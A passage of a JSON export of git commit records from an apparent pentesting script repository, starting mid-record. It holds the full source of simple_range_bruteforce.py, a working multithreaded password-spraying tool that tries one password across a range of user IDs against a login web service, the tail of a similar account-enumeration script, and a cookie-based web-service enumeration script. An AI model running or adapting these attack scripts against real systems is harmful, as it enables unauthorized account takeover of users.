re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\nprint \"[*]\", len(accounts), \"accounts found\"\n\ni = 1\nfor account in accounts:\n    i = i + 1\n    if login(account[0], passTry):\n        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n        found = found + 1\n        \n    #elif login(account[0], account[0]):\n    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n    #    found = found + 1\nprogress(i, len(accounts), found)\n", "source_code_before": null, "methods": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "methods_before": [], "changed_methods": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "nloc": 54, "complexity": 7, "token_count": 442}], "dmm_unit_size": 0.23333333333333334, "dmm_unit_complexity": 0.23333333333333334, "dmm_unit_interfacing": 0.0},
    {"hash": "1a81df2dcfa7467ab6dc44163891f5095725933a", "msg": "Update simple_range_bruteforce.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 17:03:45+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 17:03:45+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["22a8bf739099f42799205e26c85adea5e9fab88c"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 1, "insertions": 0, "lines": 1, "files": 1, "modified_files": [{"old_path": "pentesting/simple_range_bruteforce.py", "new_path": "pentesting/simple_range_bruteforce.py", "filename": "simple_range_bruteforce.py", "change_type": "ModificationType.MODIFY", "change_type_name": "MODIFY", "diff": "@@ -6,7 +6,6 @@\n # Parameter 2: Starting range (int)\n # Parameter 2: Ending range (int)\n \n-\n # Additional\n # Replace [Host] with the host\n \n", "diff_parsed": {"added": [], "deleted": [[9, ""]]}, "added_lines": 0, "deleted_lines": 1, "source_code": "# Description\n# Tries a given password on a range of userid's\n\n# Parameters\n# Parameter 1: Password to try\n# Parameter 2: Starting range (int)\n# Parameter 2: Ending range (int)\n\n# Additional\n# Replace [Host] with the host\n\nimport sys\nimport requests\nimport hashlib\nimport signal\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef signal_handler(signal, frame):\n        print('Quiting')\n        sys.exit(0)\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    print '[{0}] {1}% [{2}]\\r'.format(bar, percents, suffix),\n\ndef loginThread(account):\n    global accounts, found, i\n    if login(account, passTry):\n        print '[+] {0} with password {1} \\n'.format(account, passTry),\n        found = found + 1\n    i = i + 1\n    progress(i, len(accounts), found)\n\npassTry = sys.argv[1]\nfound = 0\ni = 1\n\naccounts = range(int(sys.argv[2]), int(sys.argv[3]))\nprint \"[*] Trying account id's between {0} and {1}, with password {2}\".format(int(sys.argv[2]), int(sys.argv[3]), passTry)\n\nsignal.signal(signal.SIGINT, signal_handler)\npool = Pool(10)\nasyncres = pool.map(loginThread, accounts)\npool.close()\npool.join()\n", "source_code_before": "# Description\n# Tries a given password on a range of userid's\n\n# Parameters\n# Parameter 1: Password to try\n# Parameter 2: Starting range (int)\n# Parameter 2: Ending range (int)\n\n\n# Additional\n# Replace [Host] with the host\n\nimport sys\nimport requests\nimport hashlib\nimport signal\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef signal_handler(signal, frame):\n        print('Quiting')\n        sys.exit(0)\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    print '[{0}] {1}% [{2}]\\r'.format(bar, percents, suffix),\n\ndef loginThread(account):\n    global accounts, found, i\n    if login(account, passTry):\n        print '[+] {0} with password {1} \\n'.format(account, passTry),\n        found = found + 1\n    i = i + 1\n    progress(i, len(accounts), found)\n\npassTry = sys.argv[1]\nfound = 0\ni = 1\n\naccounts = range(int(sys.argv[2]), int(sys.argv[3]))\nprint \"[*] Trying account id's between {0} and {1}, with password {2}\".format(int(sys.argv[2]), int(sys.argv[3]), passTry)\n\nsignal.signal(signal.SIGINT, signal_handler)\npool = Pool(10)\nasyncres = pool.map(loginThread, accounts)\npool.close()\npool.join()\n", "methods": [{"name": "signal_handler", "start_line": 22, "end_line": 24}, {"name": "login", "start_line": 26, "end_line": 52}, {"name": "progress", "start_line": 54, "end_line": 59}, {"name": "loginThread", "start_line": 61, "end_line": 67}], "methods_before": [{"name": "signal_handler", "start_line": 23, "end_line": 25}, {"name": "login", "start_line": 27, "end_line": 53}, {"name": "progress", "start_line": 55, "end_line": 60}, {"name": "loginThread", "start_line": 62, "end_line": 68}], "changed_methods": [], "nloc": 58, "complexity": 10, "token_count": 460}], "dmm_unit_size": null, "dmm_unit_complexity": null, "dmm_unit_interfacing": null},
    {"hash": "1f2a5146af00fbcd4c824ad42e84d6f6d0ec12d6", "msg": "Create webservices_overview.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 17:11:08+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 17:11:08+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["1a81df2dcfa7467ab6dc44163891f5095725933a"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 74, "lines": 74, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/webservices_overview.py", "filename": "webservices_overview.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,74 @@\n+# Description\n+# Creates an html output file with all the webservice methods in a table, joined with the description. Only outputs services that you are authorized for\n+\n+# Parameters\n+# Parameter 1: Input file with webservices\n+# Parameter 2: The session cookie\n+\n+# Additional\n+# Replace [Host] with the host\n+# Replace [Cookie_Name] with the session cookie's name\n+\n+import requests, sys, re\n+\n+input_file = sys.argv[1]\n+cookie = sys.argv[2]\n+baseUrl = 'https://[Host]/Services/'\n+\n+with open(input_file , 'r') as f:\n+    data = f.read()\n+urls = re.findall(r'([^ ]*?\\.asmx)', data)\n+\n+print '''\n+ <!-- Latest compiled and minified CSS -->\n+<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css\">\n+\n+<!-- jQuery library -->\n+<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n+\n+<!-- Popper JS -->\n+<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js\"></script>\n+\n+<!-- Latest compiled JavaScript -->\n+<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js\"></script>\n+\n+<script>\n+$(document).ready(function(){\n+    $(\"a\").on(\"click\", function(){\n+        $(this).css(\"color\", \"#efefef\");\n+    });\n+    \n+    $(\"a\").each(function(){\n+        $(this).parent().prepend('<div class=\"checkbox\" style=\"float: left; margin-top: 5px; margin-right: 5px;\"><input class=\"checkbox\" type=\"checkbox\" value=\"\"></div>');\n+    })\n+    \n+    $(\".checkbox\").on(\"click\", function(){\n+        $(this).parent().parent().toggleClass(\"green\");\n+    });\n+});\n+</script>\n+\n+<style>\n+.green {\n+    background-color: #a8ffa8;\n+}\n+</style>\n+      '''\n+\n+print \"<div class='container'><table class='table table-bordered table-bordered'>\"\n+\n+for url in urls:\n+    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})\n+    if response.status_code == 200:\n+        print '<tr style=\"background-color: grey;\"> <td>{0}</td><td></td></tr>'.format(url)\n+        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)\n+        for method in methods:\n+            if \"?op=\" in method:\n+                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})\n+                if m.status_code == 200:\n+                    description = re.findall(r'<p class=\\\"intro\\\">([^<]*?)<\\/p>', m.content)[0]\n+                    print \"<tr><td><a href='{0}'\".format(baseUrl + url + \"/\" + str(method.split(\"=\")[1])) + \">\" + str(method.split(\"=\")[1]) + \"</a></td>\"\n+                    print \"<td>\" + str(description) + \"</td></tr>\"\n+\n+\n+print \"</table></div>\"\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Creates an html output file with all the webservice methods in a table, joined with the description. Only outputs services that you are authorized for"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Input file with webservices"], [6, "# Parameter 2: The session cookie"], [7, ""], [8, "# Additional"], [9, "# Replace [Host] with the host"], [10, "# Replace [Cookie_Name] with the session cookie's name"], [11, ""], [12, "import requests, sys, re"], [13, ""], [14, "input_file = sys.argv[1]"], [15, "cookie = sys.argv[2]"], [16, "baseUrl = 'https://[Host]/Services/'"], [17, ""], [18, "with open(input_file , 'r') as f:"], [19, "    data = f.read()"], [20, "urls = re.findall(r'([^ ]*?\\.asmx)', data)"], [21, ""], [22, "print '''"], [23, " <!-- Latest compiled and minified CSS -->"], [24, "<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css\">"], [25, ""], [26, "<!-- jQuery library -->"], [27, "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>"], [28, ""], [29, "<!-- Popper JS -->"], [30, "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js\"></script>"], [31, ""], [32, "<!-- Latest compiled JavaScript -->"], [33, "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js\"></script>"], [34, ""], [35, "<script>"], [36, "$(document).ready(function(){"], [37, "    $(\"a\").on(\"click\", function(){"], [38, "        $(this).css(\"color\", \"#efefef\");"], [39, "    });"], [40, ""], [41, "    $(\"a\").each(function(){"], [42, "        $(this).parent().prepend('<div class=\"checkbox\" style=\"float: left; margin-top: 5px; margin-right: 5px;\"><input class=\"checkbox\" type=\"checkbox\" value=\"\"></div>');"], [43, "    })"], [44, ""], [45, "    $(\".checkbox\").on(\"click\", function(){"], [46, "        $(this).parent().parent().toggleClass(\"green\");"], [47, "    });"], [48, "});"], [49, "</script>"], [50, ""], [51, "<style>"], [52, ".green {"], [53, "    background-color: #a8ffa8;"], [54, "}"], [55, "</style>"], [56, "      '''"], [57, ""], [58, "print \"<div class='container'><table class='table table-bordered table-bordered'>\""], [59, ""], [60, "for url in urls:"], [61, "    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})"], [62, "    if response.status_code == 200:"], [63, "        print '<tr style=\"background-color: grey;\"> <td>{0}</td><td></td></tr>'.format(url)"], [64, "        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)"], [65, "        for method in methods:"], [66, "            if \"?op=\" in method:"], [67, "                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})"], [68, "                if m.status_code == 200:"], [69, "                    description = re.findall(r'<p class=\\\"intro\\\">([^<]*?)<\\/p>', m.content)[0]"], [70, "                    print \"<tr><td><a href='{0}'\".format(baseUrl + url + \"/\" + str(method.split(\"=\")[1])) + \">\" + str(method.split(\"=\")[1]) + \"</a></td>\""], [71, "                    print \"<td>\" + str(description) + \"</td></tr>\""], [72, ""], [73, ""], [74, "print \"</table></div>\""]], "deleted": []}, "added_lines": 74, "deleted_lines": 0, "source_code": "# Description\n# Creates an html output file with all the webservice methods in a table, joined with the description. Only outputs services that you are authorized for\n\n# Parameters\n# Parameter 1: Input file with webservices\n# Parameter 2: The session cookie\n\n# Additional\n# Replace [Host] with the host\n# Replace [Cookie_Name] with the session cookie's name\n\nimport requests, sys, re\n\ninput_file = sys.argv[1]\ncookie = sys.argv[2]\nbaseUrl = 'https://[Host]/Services/'\n\nwith open(input_file , 'r') as f:\n    data = f.read()\nurls = re.findall(r'([^ ]*?\\.asmx)', data)\n\nprint '''\n <!-- Latest compiled and minified CSS -->\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css\">\n\n<!-- jQuery library -->\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n\n<!-- Popper JS -->\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js\"></script>\n\n<!-- Latest compiled JavaScript -->\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js\"></script>\n\n<script>\n$(document).ready(function(){\n    $(\"a\").on(\"click\", function(){\n        $(this).css(\"color\", \"#efefef\");\n    });\n    \n    $(\"a\").each(function(){\n        $(this).parent().prepend('<div class=\"checkbox\" style=\"float: left; margin-top: 5px; margin-right: 5px;\"><input class=\"checkbox\" type=\"checkbox\" value=\"\"></div>');\n    })\n    \n    $(\".checkbox\").on(\"click\", function(){\n        $(this).parent().parent().toggleClass(\"green\");\n    });\n});\n</script>\n\n<style>\n.green {\n    background-color: #a8ffa8;\n}\n</style>\n      '''\n\nprint \"<div class='container'><table class='table table-bordered table-bordered'>\"\n\nfor url in urls:\n    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})\n    if response.status_code == 200:\n        print '<tr style=\"background-color: grey;\"> <td>{0}</td><td></td></tr>'.format(url)\n        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)\n        for method in methods:\n            if \"?op=\" in method:\n                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})\n                if m.status_code == 200:\n                    description = re.findall(r'<p class=\\\"intro\\\">([^<]*?)<\\/p>', m.content)[0]\n                    print \"<tr><td><a href='{0}'\".format(baseUrl + url + \"/\" + str(method.split(\"=\")[1])) + \">\" + str(method.split(\"=\")[1]) + \"</a></td>\"\n                    print \"<td>\" + str(description) + \"</td></tr>\"\n\n\nprint \"</table></div>\"\n", "source_code_before": null, "methods": [], "methods_before": [], "changed_methods": [], "nloc": 56, "complexity": 0, "token_count": 210}], "dmm_unit_size": null, "dmm_unit_complexity": null, "dmm_unit_interfacing": null}
  ],
  "process_metrics": {},
  "metrics_type": "weekly",
  "processing": {
    "total_commits": 11,
    "total_lines_added": 504,
    "total_lines_removed": 87
  }
}
